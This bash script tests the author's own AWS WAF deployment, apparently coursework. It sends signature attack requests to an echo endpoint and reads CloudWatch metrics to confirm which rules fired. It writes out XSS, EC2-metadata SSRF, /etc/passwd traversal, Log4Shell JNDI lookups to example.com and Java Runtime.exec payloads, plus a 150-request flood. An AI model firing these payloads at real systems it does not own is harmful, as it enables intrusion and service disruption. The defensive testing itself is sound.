#!/usr/bin/env bash
#
# Attack simulation for the Week 13 WAF build.
#
# Sends benign-but-rule-matching requests to YOUR OWN endpoints to prove each
# rule fires. Nothing here is an exploit: the payloads are the well-known
# signature strings the managed rule groups look for, sent to a Lambda that
# echoes its input and does nothing else. There is no third-party target and
# no vulnerability being exercised.
#
#   ./attack_simulation.sh <cloudfront_url> <api_invoke_url>
#
# IMPORTANT: in Count mode an HTTP status tells you almost nothing. Every
# request returns 200 because nothing is being blocked -- that is the whole
# point of the phase. Worse, some non-200 responses have nothing to do with
# WAF at all: API Gateway returns 400 for a malformed path and 405 for an
# unsupported method, and CloudFront returns 403 for a method outside its
# allowed list. Reading those as "WAF blocked it" is simply wrong.
#
# So this script reports raw status codes without interpreting them, then
# queries CloudWatch for what the rules ACTUALLY matched. The metrics are the
# evidence; the status codes are just context.

set -uo pipefail

if [[ $# -lt 2 ]]; then
  echo "Usage: $0 <cloudfront_url> <api_invoke_url>" >&2
  echo "  Get both from: terraform output" >&2
  exit 1
fi

EDGE_URL="${1%/}"
ORIGIN_URL="${2%/}"

EDGE_ACL="${EDGE_ACL:-week13-waf-edge}"
REGIONAL_ACL="${REGIONAL_ACL:-week13-waf-regional}"
REGION="${AWS_REGION:-us-east-1}"

# Must exceed the rate_limit Terraform variable (default 100) within the
# evaluation window (default 60s).
FLOOD_COUNT="${FLOOD_COUNT:-150}"

hr() { printf '%s\n' "------------------------------------------------------------"; }

# Report the status code. Deliberately does NOT judge it -- see the header.
probe() {
  local label="$1" url="$2"
  shift 2
  local status
  status=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 "$@" "$url" 2>/dev/null)
  printf '  %-44s -> HTTP %s\n' "$label" "$status"
}

run_suite() {
  local name="$1" base="$2"

  hr
  echo "Target: $name"
  echo "        $base"
  hr

  echo "[0] Baseline -- a normal request. Must stay 200 in every mode;"
  echo "    if this ever fails, a rule is rejecting legitimate traffic."
  probe "GET / (benign)" "$base/"

  echo
  echo "[1] Core rule set -- cross-site scripting in a query string"
  probe "XSS in query string" "$base/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"

  echo
  echo "[2] Core rule set -- SSRF against the EC2 metadata endpoint"
  probe "IMDS SSRF in query argument" \
    "$base/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"

  echo
  echo "[3] Core rule set -- local file inclusion in a query argument"
  echo "    (query arg, not URI path: a traversal sequence in the path is"
  echo "     rejected by API Gateway with a 400 before WAF is consulted)"
  probe "Path traversal in query argument" "$base/?file=..%2F..%2F..%2Fetc%2Fpasswd"

  echo
  echo "[4] Core rule set -- request with no User-Agent header"
  probe "Missing User-Agent" "$base/" -H "User-Agent;"

  echo
  echo "[5] Known bad inputs -- Log4Shell (CVE-2021-44228) in a header"
  probe "Log4Shell JNDI in header" "$base/" \
    -H 'X-Api-Version: ${jndi:ldap://example.com/a}'

  echo
  echo "[6] Known bad inputs -- Java deserialization RCE in query string"
  probe "Java deserialization RCE" \
    "$base/?p=%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22whoami%22%29"

  echo
  echo "[7] Known bad inputs -- Log4Shell in the URI path"
  probe "Log4Shell JNDI in URI path" "$base/%24%7Bjndi%3Aldap%3A%2F%2Fexample.com%2Fa%7D"

  echo
  echo "[8] Rate-based rule -- ${FLOOD_COUNT} concurrent requests"
  echo "    (WAF re-checks the rate about every 10s, so requests sent before"
  echo "     the next check still get through even once over the limit)"
  for _ in $(seq 1 "$FLOOD_COUNT"); do
    curl -sS -o /dev/null -w '%{http_code}\n' --max-time 10 "$base/" 2>/dev/null &
  done | sort | uniq -c | sed 's/^/      /'
  wait
  echo
}

# The actual evidence. In Count mode this is the ONLY way to know a rule fired.
summarize() {
  local label="$1" acl="$2" region_dim="$3"

  local start end
  start=$(date -u -d '45 min ago' +%Y-%m-%dT%H:%M:%SZ 2>/dev/null) || return 0
  end=$(date -u +%Y-%m-%dT%H:%M:%SZ)

  hr
  echo "$label -- what the rules actually matched"
  hr

  local -a dims
  for metric in CountedRequests BlockedRequests; do
    for rule in "${acl}-common-rule-set" "${acl}-known-bad-inputs" \
                "${acl}-rate-limit" "${acl}-anti-ddos" "${acl}-blocked-ip-set" ALL; do
      dims=(Name=WebACL,Value="$acl" Name=Rule,Value="$rule")
      # CloudFront-scope metrics carry NO Region dimension; regional ones do.
      [[ -n "$region_dim" ]] && dims+=(Name=Region,Value="$region_dim")

      local v
      v=$(aws cloudwatch get-metric-statistics \
            --namespace AWS/WAFV2 --metric-name "$metric" \
            --statistics Sum --period 3600 \
            --start-time "$start" --end-time "$end" \
            --dimensions "${dims[@]}" --region "$REGION" \
            --query 'Datapoints[0].Sum' --output text 2>/dev/null)
      [[ -z "$v" || "$v" == "None" ]] && continue
      printf '  %-16s %-46s %s\n' "$metric" "$rule" "${v%.0}"
    done
  done
  echo
}

echo
echo "WAF attack simulation -- Week 13"
echo "All payloads are signature strings sent to your own echo endpoint."
echo

run_suite "CloudFront edge (CLOUDFRONT-scope ACL + Shield Standard)" "$EDGE_URL"
run_suite "API Gateway origin, bypassing the edge (REGIONAL-scope ACL)" "$ORIGIN_URL"

echo "Waiting 90s for CloudWatch metrics to land..."
sleep 90
echo

summarize "EDGE  ($EDGE_ACL)"     "$EDGE_ACL"     ""
summarize "ORIGIN ($REGIONAL_ACL)" "$REGIONAL_ACL" "$REGION"

cat <<'EOF'
Reading this:
  CountedRequests > 0  ->  the rule matched and WOULD have blocked, but did
                           not, because count_mode is still true.
  BlockedRequests > 0  ->  the rule matched and DID block (count_mode false).

Per-request verdicts, including which rule matched:
  MSYS_NO_PATHCONV=1 aws logs tail /aws-waf-logs-<name> --since 15m

In Git Bash, prefix any aws command whose argument starts with "/" with
MSYS_NO_PATHCONV=1 -- otherwise the leading slash is rewritten into a Windows
path and the call fails with a misleading parameter error.
EOF
